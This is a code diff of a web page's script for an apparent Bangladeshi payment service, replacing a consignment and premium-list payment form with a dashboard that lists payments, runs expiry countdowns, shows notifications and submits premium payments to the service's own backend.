-            const serviceType = group.querySelector('.service-type').value;
-            const validServiceTypes = ['pricecng', 'partial', 'drto', 'delivery', 'return', 'list'];
-            if (!validServiceTypes.includes(serviceType)) {
-              throw new Error(`Consignment ${index + 1}: Invalid service type`);
-            }
-
-            const consignment = {
-                serviceType: serviceType,
-                name: group.querySelector('.name').value.trim(),
-                phone: group.querySelector('.phone1').value.replace(/\D/g, ''),
-                amount1: parseFloat(group.querySelector('.amount1').value) || 0,
-                amount2: parseFloat(group.querySelector('.amount2').value) || 0
-            };
-
-            // Validate consignment data
-            if (!consignment.name || !validatePhone(consignment.phone)) {
-                throw new Error(`Consignment ${index + 1} has invalid data`);
-            }
-
-            // Service-specific validation
-            if (serviceType === 'pricecng' || serviceType === 'partial') {
-                if (!validateAmount(consignment.amount1) || 
-                    !validateAmount(consignment.amount2)) {
-                    throw new Error(`Consignment ${index + 1} has invalid amounts`);
-                }
-                if (consignment.amount2 >= consignment.amount1) {
-                    throw new Error(`Consignment ${index + 1}: Updated amount must be less than original`);
-                }
-                totalCharge += (consignment.amount1 - consignment.amount2) / 2;
-            } 
-            else if (serviceType === 'drto') {
-                if (consignment.amount2 > 0 && !validateAmount(consignment.amount2)) {
-                    throw new Error(`Consignment ${index + 1} has invalid amount`);
-                }
-                if (consignment.amount2 < 40) {
-                    totalCharge += 40;
-                }
-            }
-
-            formData.consignments.push(consignment);
+function showPaymentNotification(payment) {
+    playNotificationSound();
+    
+    if ('Notification' in window && Notification.permission === 'granted') {
+        new Notification('Payment Completed', {
+            body: `TRX ID: ${payment.trxid} - Amount: ৳${payment.amount}`,
+            icon: 'https://oneai-wjox.onrender.com/images/logo.png'
         });
-
-        // Apply discount
-        if (formData.discount > 0) {
-            totalCharge *= (1 - formData.discount / 100);
-        }
-
-        // Set final amount
-        formData.amount3 = parseFloat(totalCharge.toFixed(2));
-        return formData;
     }
+  
+    paymentState.unreadNotifications++;
+    const badge = document.getElementById('notification-badge');
+    badge.textContent = paymentState.unreadNotifications;
+    badge.classList.remove('hidden');
+}
 
-    function handleSuccess(data, formData) {
-        localStorage.setItem('recentPayment', JSON.stringify({
-            company: formData.company,
-            trxid: formData.trxid,
-            amount: formData.amount3,
-            status: 'Pending',
-            timestamp: Date.now()
-        }));
+function showPaymentPopup(payment) {
+    const popup = document.getElementById('payment-popup');
+    document.getElementById('popup-trxid').textContent = payment.trxid;
+    document.getElementById('popup-amount').textContent = payment.amount3.toFixed(2);
+    
+    popup.classList.add('active');
+    
+    // Auto-close after 10 seconds
+    setTimeout(() => {
+        popup.classList.remove('active');
+    }, 10000);
+}
 
-        showMessage('Payment successfully processed! Redirecting...', 'success');
-        setTimeout(() => window.location.href = 'dashboard.html', 2000);
+function closePaymentPopup() {
+    document.getElementById('payment-popup').classList.remove('active');
+}
+
+function handlePaymentCompletion(payment) {
+    showPaymentPopup(payment); // Show the popup
+    showPaymentNotification(payment); // Show the system notification
+    playNotificationSound(); // Play the sound
+    
+    if ('vibrate' in navigator) {
+        navigator.vibrate([300, 100, 300]);
     }
+    
+    setTimeout(refreshPayments, 2000);
+}
 
-    function handleServerError(responseData) {
-        let errorMessage = 'Payment processing failed';
-        
-        // Handle validation errors
-        if (responseData.errors) {
-            errorMessage = Object.values(responseData.errors)
-                .map(err => err.message || err)
-                .join('\n');
-        } 
-        else if (responseData.message) {
-            errorMessage = responseData.message;
-        }
-        
-        showMessage(`Error: ${errorMessage}`, 'error');
+function renderAllPayments() {
+    const tbody = document.getElementById('payment-status');
+    const paymentSection = document.querySelector('.payment-section');
+    tbody.innerHTML = '';
+    
+    if (paymentState.payments.length === 0) {
+        tbody.innerHTML = `<tr><td colspan="6" class="text-center">No payments found</td></tr>`;
+        paymentSection.style.display = 'none'; // Hide the entire section
+        return;
+    } else {
+        paymentSection.style.display = 'block'; // Ensure it's visible if there are payments
     }
+    
+    const sortedPayments = [...paymentState.payments].sort((a, b) => 
+        new Date(b.createdAt) - new Date(a.createdAt)
+    );
+    
+    sortedPayments.forEach(renderPayment);
+}
 
-    function handleNetworkError(error) {
-        const message = error.message.includes('Failed to fetch')
-            ? 'Network Error: Check internet connection'
-            : error.message;
-        showMessage(`Error: ${message}`, 'error');
+function renderPayment(payment) {
+    const tbody = document.getElementById('payment-status');
+    const existingRow = document.querySelector(`tr[data-trxid="${payment.trxid}"]`);
+    
+    if (existingRow) {
+        updatePaymentRow(existingRow, payment);
+        return;
     }
-
-    function showMessage(text, type) {
-        const messageDiv = document.getElementById('confirmation-message');
-        messageDiv.innerHTML = `
-            <div class="alert-${type === 'success' ? 'success' : 'error'}">
-                ${text}
-            </div>
+    
+    const row = document.createElement('tr');
+    row.dataset.trxid = payment.trxid;
+    const createdAt = new Date(payment.createdAt || Date.now());
+    const expiryTime = createdAt.getTime() + (3 * 60 * 60 * 1000);
+    
+    let companyCell;
+    if (payment.company === 'premium_service') {
+        // Premium service with crown icon
+        companyCell = `<td><i class="fas fa-crown premium-icon"></i> Premium Service</td>`;
+        row.classList.add('premium-payment');
+    } else {
+        companyCell = `<td>${formatCompanyName(payment.company) || 'N/A'}</td>`;
+    }
+    
+    // Special handling for premium services
+    if (payment.company === 'premium_service') {
+        row.innerHTML = `
+            ${companyCell}
+            <td><code>${payment.trxid}</code></td>
+            <td>৳${(payment.amount3 || 0).toFixed(2)}</td>
+            <td><span class="status ${(payment.status || 'pending').toLowerCase()}">${payment.status || 'Pending'}</span></td>
+            <td>Premium service</td>
+            <td>
+                <button class="action-btn small" onclick="viewPaymentDetails('${payment.trxid}')">
+                    <i class="fas fa-eye"></i> View
+                </button>
+            </td>
         `;
-        setTimeout(() => messageDiv.innerHTML = '', 5000);
+    } else {
+        // Regular payment row
+        row.innerHTML = `
+            ${companyCell}
+            <td><code>${payment.trxid}</code></td>
+            <td>৳${(payment.amount3 || 0).toFixed(2)}</td>
+            <td><span class="status ${(payment.status || 'pending').toLowerCase()}">${payment.status || 'Pending'}</span></td>
+            <td class="countdown" data-expiry="${expiryTime}">Calculating...</td>
+            <td>
+                <button class="action-btn small" onclick="viewPaymentDetails('${payment.trxid}')">
+                    <i class="fas fa-eye"></i> View
+                </button>
+            </td>
+        `;
     }
-
-    // Consignment Management
-    function addConsignment() {
-        const container = document.getElementById('consignments-container');
-        const firstGroup = document.querySelector('.consignment-group');
-        const newGroup = firstGroup.cloneNode(true);
-        
-        // Update all input names with new index
-        newGroup.querySelectorAll('input, select').forEach(input => {
-            const name = input.name.replace('[0]', `[${consignmentIndex}]`);
-            input.name = name;
-            input.value = '';
-        });
-        
-        // Update counter display
-        newGroup.querySelector('.consignment-counter').textContent = `Consignment #${consignmentIndex + 1}`;
-        
-        // Reset service type and fields
-        const serviceTypeSelect = newGroup.querySelector('.service-type');
-        serviceTypeSelect.value = '';
-        serviceTypeSelect.onchange = function() { updateAmountFields(this); };
-        
-        // Add amount field listeners
-        newGroup.querySelectorAll('.amount1, .amount2').forEach(input => {
-            input.oninput = calculateTotalCharge;
-        });
-        
-        container.appendChild(newGroup);
-        consignmentIndex++;
-        calculateTotalCharge();
+    
+    tbody.appendChild(row);
+    
+    // Only start countdown for non-premium pending payments
+    if (payment.company !== 'premium_service' && (!payment.status || payment.status === 'Pending')) {
+        startCountdown(row.querySelector('.countdown'), payment.trxid);
     }
+}
 
-    function removeConsignment(element) {
-        if (document.querySelectorAll('.consignment-group').length > 1) {
-            element.closest('.consignment-group').remove();
-            consignmentIndex--;
-            calculateTotalCharge();
+function updatePaymentRow(row, payment) {
+    const statusCell = row.querySelector('.status');
+    if (statusCell) {
+        statusCell.className = `status ${(payment.status || 'pending').toLowerCase()}`;
+        statusCell.textContent = payment.status || 'Pending';
+    }
+    
+    const amountCell = row.querySelector('td:nth-child(3)');
+    if (amountCell) {
+        amountCell.textContent = `৳${(payment.amount3 || 0).toFixed(2)}`;
+    }
+    
+    const countdownCell = row.querySelector('.countdown');
+    
+    // Only update countdown for non-premium payments
+    if (payment.company !== 'premium_service') {
+        if (payment.status !== 'Pending') {
+            if (countdownCell) {
+                countdownCell.innerHTML = payment.status;
+                countdownCell.classList.add('expired');
+            }
+            
+            if (paymentState.paymentTimers[payment.trxid]) {
+                clearInterval(paymentState.paymentTimers[payment.trxid]);
+                delete paymentState.paymentTimers[payment.trxid];
+            }
         }
     }
+}
 
-    function clearForm() {
-        document.getElementById('payment-form').reset();
-        const container = document.getElementById('consignments-container');
-        while (container.children.length > 1) {
-            container.removeChild(container.lastChild);
+function startCountdown(element, trxid) {
+    const expiry = parseInt(element.dataset.expiry);
+    
+    function update() {
+        const now = Date.now();
+        const diff = expiry - now;
+
+        if (diff <= 0) {
+            element.innerHTML = 'Expired';
+            element.classList.add('expired');
+            
+            if (paymentState.paymentTimers[trxid]) {
+                clearInterval(paymentState.paymentTimers[trxid]);
+                delete paymentState.paymentTimers[trxid];
+            }
+            return;
         }
-        consignmentIndex = 1;
-        calculateTotalCharge();
+
+        const hours = Math.floor(diff / 3600000);
+        const minutes = Math.floor((diff % 3600000) / 60000);
+        const seconds = Math.floor((diff % 60000) / 1000);
+
+        element.innerHTML = `${hours}h ${minutes}m ${seconds}s`;
     }
 
-    // Initialize form on load
-    document.addEventListener('DOMContentLoaded', function() {
-      // Initialize all service type fields
-      document.querySelectorAll('.service-type').forEach(select => {
-        updateAmountFields(select);
-      });
-      
-      // Initialize discount display
-      if (typeof window.updateDiscountDisplay === 'function') {
-        window.updateDiscountDisplay();
-      }
-      
-      // Add real-time calculation listeners
-      document.querySelectorAll('.amount1, .amount2').forEach(input => {
-        input.addEventListener('input', calculateTotalCharge);
-      });
-    });
+    update();
+    paymentState.paymentTimers[trxid] = setInterval(update, 1000);
+}
 
- // Scope Premium Service Functionality
-  window.showScopeDialog = function() {
-    const dialogContent = `
-      <div class="scope-content">
-        <h2><i class="fas fa-crown"></i> ইস্যুলেস প্রিমিয়াম মার্চেন্ট লিস্ট</h2>
-        <p>Fabrilife, Sunnah Sqr, Arogga, Daily Buy BD, Giftbd.com .</p>
-        <p>এরকম যে সকল পেইজ এ প্রাইসচেঞ্জ সম্পর্কিত পেনাল্টি আসার রেকর্ড নেই সেই সমস্ত পেইজ এর প্রিমিয়াম ডিটেইলস পেতে নির্ধারিত প্যাকেজ সিলেক্ট করে পেমেন্ট সম্পন্ন করুন এবং ট্রান্সেকশান আইডি সাবমিট করুন।</p>
-        
-        <div class="scope-form-group">
-          <label for="scope-phone">WhatsApp Number:</label>
-          <input type="tel" id="scope-phone" 
-                 pattern="01[3-9]\\d{8}" 
-                 placeholder="01XXXXXXXXX" required>
-        </div>
-        
-        <div class="scope-form-group">
-          <label for="scope-trxid">Payment TRX ID:</label>
-          <input type="text" id="scope-trxid" 
-                 minlength="8" placeholder="Enter your payment TRX ID" required>
-        </div>
-        
-        <div class="scope-form-group">
-          <label for="scope-amount">প্যাকেজ সিলেক্ট করুন :</label>
-          <select id="scope-amount" required>
-            <option value="">Select Package</option>
-            <option value="300">টপ 10 পেইজ(300 BDT)</option>
-            <option value="500">টপ 25 পেইজ(500 BDT)</option>
-            <option value="1000">সম্পূর্ণ ডাটাবেজ(1000 BDT)</option>
-          </select>
-        </div>
-        
-        <div class="scope-actions">
-          <button class="scope-close" onclick="this.closest('dialog').close()">Close</button>
-          <button class="scope-submit" onclick="submitScopeRequest()">Submit Payment</button>
-        </div>
-        
-        <p style="margin-top: 1rem; font-size: 0.9em;">
-          <i class="fas fa-info-circle"></i> Note: পেমেন্ট ভেরিফিকেশন এর পর প্রদত্ত হোয়াটসএপ নাম্বারে প্যাকেজটির লিংক পাঠানো হবে।
-        </p>
-      </div>
-    `;
+function updateStats() {
+    paymentState.stats = {
+        active: paymentState.payments.filter(p => p.status === 'Pending').length,
+        completed: paymentState.payments.filter(p => p.status === 'Completed').length,
+        failed: paymentState.payments.filter(p => p.status === 'Failed').length
+    };
     
-    const dialog = document.createElement('dialog');
-    dialog.className = 'scope-dialog';
-    dialog.innerHTML = dialogContent;
-    document.body.appendChild(dialog);
-    dialog.showModal();
-  };
+    document.getElementById('active-payments').textContent = paymentState.stats.active;
+    document.getElementById('completed-payments').textContent = paymentState.stats.completed;
+    document.getElementById('failed-payments').textContent = paymentState.stats.failed;
+}
 
-  window.submitScopeRequest = async function() {
-    const phone = document.getElementById('scope-phone').value.trim();
-    const trxid = document.getElementById('scope-trxid').value.trim();
-    const amount = document.getElementById('scope-amount').value;
-    const service = "list";
-    
-    if (!phone || !trxid || !amount) {
-      showMessage('Please fill all required fields', 'error');
-      return;
+function formatCompanyName(company) {
+    const names = {
+        'govt_nid': 'Govt NID',
+        'redx': 'RedX',
+        'pathao': 'Pathao',
+        'steadfast': 'SteadFast',
+        'premium_service': 'Premium Service'
+    };
+    return names[company] || company;
+}
+
+// UI Functions
+function showError(message) {
+    const errorDiv = document.createElement('div');
+    errorDiv.className = 'error';
+    errorDiv.innerHTML = `<i class="fas fa-exclamation-circle"></i> ${message}`;
+    document.body.prepend(errorDiv);
+    setTimeout(() => errorDiv.remove(), 5000);
+}
+
+function showSuccess(message) {
+    const successDiv = document.createElement('div');
+    successDiv.className = 'success';
+    successDiv.innerHTML = `<i class="fas fa-check-circle"></i> ${message}`;
+    document.body.prepend(successDiv);
+    setTimeout(() => successDiv.remove(), 5000);
+}
+
+// Initialize dashboard
+document.addEventListener('DOMContentLoaded', async () => {
+    if ('Notification' in window) {
+        try {
+            await Notification.requestPermission();
+        } catch (error) {
+            console.error('Notification permission error:', error);
+        }
     }
     
-    if (!/^01[3-9]\d{8}$/.test(phone)) {
-      showMessage('Invalid Bangladeshi phone number', 'error');
-      return;
-    }
+    const loadingOverlay = document.querySelector('.loading-overlay');
+    loadingOverlay.style.display = 'flex';
     
     try {
-      loadingOverlay.style.display = 'flex';
-      
-      const authToken = localStorage.getItem('authToken');
-      const userID = localStorage.getItem('userID');
-      
-      if (!authToken || !userID) {
-        throw new Error('Authentication required. Please login again.');
-      }
-      
-      const response = await fetch('https://oneai-wjox.onrender.com/premium-payment', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-          'Authorization': `Bearer ${authToken}`,
-          'X-User-ID': userID
-        },
-        body: JSON.stringify({ 
-          phone,
-          trxid,
-          amount: parseFloat(amount),
-          service,
-          type: 'premium' 
-        })
-      });
-      
-    const data = await response.json();
-    
-    if (data.success) {
-      document.querySelector('.scope-dialog').close();
-      document.querySelector('.scope-dialog').remove();
-      
-      showMessage('Payment submitted! Redirecting...', 'success');
-      setTimeout(() => window.location.href = 'dashboard.html', 2000);
-    } else {
-      throw new Error(data.message || 'Payment failed');
-    }
-  } catch (error) {
-    showMessage(`Error: ${error.message}`, 'error');
-  } finally {
-    loadingOverlay.style.display = 'none';
-  }
-  };
+        const authToken = localStorage.getItem('authToken');
+        const userID = localStorage.getItem('userID');
+        
+        if (!authToken || !userID) {
+            window.location.href = 'login.html';
+            return;
+        }
 
-    function showConfirmationDialog(phone, amount) {
-        const confirmationContent = `
-            <div class="confirmation-content">
-                <h2><i class="fas fa-check-circle"></i> Payment Received</h2>
-                <p>Your premium package payment of ${amount} BDT has been successfully submitted.</p>
-                <p>The package details will be sent to ${phone} via WhatsApp after verification.</p>
-                <button class="confirmation-ok" onclick="this.closest('dialog').close()">OK</button>
-            </div>
-        `;
+        await refreshPayments();
+        connectWebSocket();
+    } catch (error) {
+        showError(error.message || 'Failed to initialize dashboard');
+    } finally {
+        loadingOverlay.style.display = 'none';
+    }
+    
+    setInterval(refreshPayments, 30000);
+});
+
+// Global functions
+window.viewPaymentDetails = function(trxid) {
+    const payment = paymentState.payments.find(p => p.trxid === trxid);
+    if (payment) {
+        alert(`
+            Company: ${formatCompanyName(payment.company)}\n
+            TRX ID: ${payment.trxid}\n
+            Amount: ৳${payment.amount3.toFixed(2)}\n
+            Status: ${payment.status}\n
+            Created: ${new Date(payment.createdAt).toLocaleString()}
+        `);
+    } else {
+        showError('Payment details not found');
+    }
+};
+
+window.showPremiumPaymentForm = function() {
+    document.getElementById('premium-modal').style.display = 'flex';
+};
+
+// FIXED PAYMENT SUBMISSION (added auth headers)
+window.submitPremiumPayment = async function() {
+    const loadingOverlay = document.querySelector('.loading-overlay');
+    loadingOverlay.style.display = 'flex';
+    
+    const authToken = localStorage.getItem('authToken');
+    const userID = localStorage.getItem('userID');
+    const phone = document.getElementById('premium-phone').value;
+    const trxid = document.getElementById('premium-trxid').value;
+    const amount = document.getElementById('premium-amount').value;
+    const service = document.getElementById('premium-service').value;
+    
+    if (!phone || !trxid || !amount) {
+        showError('All fields are required');
+        loadingOverlay.style.display = 'none';
+        return;
+    }
+
+    try {
+        const response = await fetch('https://oneai-wjox.onrender.com/premium-payment', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                'Authorization': `Bearer ${authToken}`, // ADDED AUTH HEADER
+                'X-User-ID': userID // ADDED USER ID HEADER
+            },
+            body: JSON.stringify({ phone, trxid, amount, service, type: 'premium' })
+        });
         
-        const dialog = document.createElement('dialog');
-        dialog.className = 'confirmation-dialog';
-        dialog.innerHTML = confirmationContent;
-        document.body.appendChild(dialog);
+        const data = await response.json();
+        if (!response.ok) throw new Error(data.message || 'Submission failed');
+
+        document.getElementById('premium-modal').style.display = 'none';
+        document.getElementById('premium-phone').value = '';
+        document.getElementById('premium-trxid').value = '';
+        document.getElementById('premium-amount').value = '';
         
-        dialog.showModal();
+        paymentState.payments.push(data.payment);
+        renderPayment(data.payment);
+        updateStats();
+        showSuccess('Premium payment submitted!');
+    } catch (error) {
+        showError(error.message);
+    } finally {
+        loadingOverlay.style.display = 'none';
+    }
+};
+
+window.sendHelpRequest = function() {
+    const payment = paymentState.payments[0];
+    const message = payment 
+        ? `Need help with payment:\nTRX: ${payment.trxid}\nAmount: ৳${payment.amount3.toFixed(2)}\nStatus: ${payment.status}`
+        : 'I need assistance with your services';
+    window.open(`https://wa.me/8801568760780?text=${encodeURIComponent(message)}`, '_blank');
+};
+
+window.showHelpInstructions = function() {
+    alert("Help instructions:\n1. Check payment status in the table\n2. Use FAST SERVICE button for urgent help\n3. Refresh payments every 30 minutes");
+};
+
+window.refreshPayments = async function() {
+    const loadingOverlay = document.querySelector('.loading-overlay');
+    const authToken = localStorage.getItem('authToken');
+    const userID = localStorage.getItem('userID');
+    
+    try {
+        loadingOverlay.style.display = 'flex';
+        Object.values(paymentState.paymentTimers).forEach(clearInterval);
+        paymentState.paymentTimers = {};
         
-        dialog.addEventListener('click', (e) => {
-            if (e.target === dialog) {
-                dialog.close();
-                dialog.remove();
+        const response = await fetch('https://oneai-wjox.onrender.com/payments/user', {
+            headers: { 
+                'Authorization': `Bearer ${authToken}`, 
+                'X-User-ID': userID 
             }
         });
-    };
-  </script>
-  <script src="./assets/js/load-navbar.js"></script>
-  <script src="./assets/js/main.js"></script>
-  <p>1Ai এর সাথেই থাকুন ওয়ানএআই আপনার ডিজিটাল সমস্যার স্মার্ট সমাধান।</p>
+        
+        if (!response.ok) throw new Error('Failed to fetch payments');
+        
+        const data = await response.json();
+        paymentState.payments = data.payments || [];
+        renderAllPayments();
+        updateStats();
+        showSuccess('Payments refreshed');
+    } catch (error) {
+        showError(error.message || 'Refresh failed');
+    } finally {
+        loadingOverlay.style.display = 'none';
+    }
+};
+
+// Initialize notification badge handler
+document.addEventListener('DOMContentLoaded', () => {
+    document.getElementById('notification-badge').addEventListener('click', function() {
+        paymentState.unreadNotifications = 0;
+        this.classList.add('hidden');
+        alert('All notifications cleared');
+    });
+});
+</script>
+<script src="./assets/js/load-navbar.js"></script>
+<script src="./assets/js/main.js"></script>
+<script src="./assets/js/hackeranimation.js"></script>
 </body>
 </html>
